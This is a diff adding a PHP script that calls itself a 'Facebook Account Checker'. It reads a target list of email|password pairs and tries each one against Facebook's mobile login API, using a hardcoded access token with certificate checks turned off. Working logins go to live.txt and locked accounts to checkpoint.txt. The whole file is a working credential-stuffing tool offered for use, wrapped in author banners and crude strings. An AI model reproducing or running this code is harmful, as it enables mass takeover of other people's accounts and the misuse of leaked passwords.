@@ -1,0 +1,83 @@
+<?php
+system(clear);
+system("toilet -f big 'Facebook' -F gay | lolcat");
+sleep(2);
+system("toilet -f big 'Checker' -F gay | lolcat");
+$biru = "\e[34m";
+$kuning = "\e[33m";
+$cyan = "\e[96m";
+$magenta = "\e[35m";
+$hijau = "\e[92m";
+$merah = "\e[91m";
+$green = "\e[92m";
+$whit = "\e[97m";
+
+// delaying execution of the script for 2 seconds 
+sleep(5); 
+
+echo "+ //////////////////////////////+\n";
+echo "\e[92m FACEBOOK ACCOUNT CHECKER 2020 \n";
+echo "\e[97m + //////////////////////////////+\n";
+echo "\e[97m + //////////////////////////////+\n";
+echo "\e[92m YouTube: BDKR-28 Backup \n";
+echo "\e[97m + //////////////////////////////+\n";
+echo "\e[97m + //////////////////////////////+\n";
+echo "\e[92m Github: github.com/bokxud \n";
+echo "\e[97m + //////////////////////////////+\n";
+echo "\e[97m + //////////////////////////////+\n";
+echo "\e[92m Telegram: BDKR-28 DISCUSSED \n";
+echo "\e[97m + //////////////////////////////+\n";
+echo "\e[97m + //////////////////////////////+\n";
+echo "\e[92m Author: BDKR28 \n";
+echo "\e[97m + //////////////////////////////+\n";
+sleep(10);
+system(clear);
+system("toilet -f big 'B D K R 28' -F gay | lolcat");
+echo "🖕🖕🖕🖕🖕>>>👉👌<<<🖕🖕🖕🖕🖕 \n";
+echo "\n";
+echo "\n";
+echo "\n";
+echo "\n";
+if(isset($argv[1])) {
+    if(file_exists($argv[1])) {
+        $cokot = explode(PHP_EOL, file_get_contents($argv[1]));
+        foreach($cokot as $iyeukorbannaatawalistna) {
+            $potong = explode("|", $iyeukorbannaatawalistna);
+            nyobianAkun($potong[0], $potong[1]);
+          
+        }
+    }else die("File doesn't exist!");
+}else die("$merah Usage: php ... php targets.txt \n");
+function nyobianAkun($emailnaetateh, $iyeutehsandina) {
+    $asaltisakabehna = array(
+        "access_token" => "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+        "email" => $emailnaetateh,
+        "password" => $iyeutehsandina,
+        "locale" => "en_US",
+        "format" => "JSON"
+    );
+    $sig = "";
+    foreach($asaltisakabehna as $key => $value) { $sig .= $key."=".$value; }
+    $sig = md5($sig);
+    $asaltisakabehna['sig'] = $sig;
+    $ch = curl_init("https://b-api.facebook.com/method/auth.login");
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $asaltisakabehna);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 9; FUCKER) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36");
+    $hasilnatidiyeulurrr = json_decode(curl_exec($ch));
+    
+     sleep(1);
+echo "\e[34m =>\e[34m ";
+    $emailjeungpasswordnangahiji =  $emailnaetateh."|".$iyeutehsandina;
+    if(isset($hasilnatidiyeulurrr->access_token)) { 
+    	 echo $hijau;
+        echo $emailjeungpasswordnangahiji."  \e[32m [LIVE]".PHP_EOL;
+        file_put_contents("live.txt", $emailjeungpasswordnangahiji.PHP_EOL, FILE_APPEND);
+    }elseif($hasilnatidiyeulurrr->error_code == 405 || preg_match("/User must verify their account/i", $hasilnatidiyeulurrr->error_msg)) {
+        echo $merah;
+echo  $emailjeungpasswordnangahiji."\e[91m [CHECKPOINT]\e[34m".PHP_EOL;
+        file_put_contents("checkpoint.txt", $emailjeungpasswordnangahiji.PHP_EOL, FILE_APPEND);
+    }else echo  $emailjeungpasswordnangahiji."\e[91m  [DEAD]\e[34m".PHP_EOL;
+}
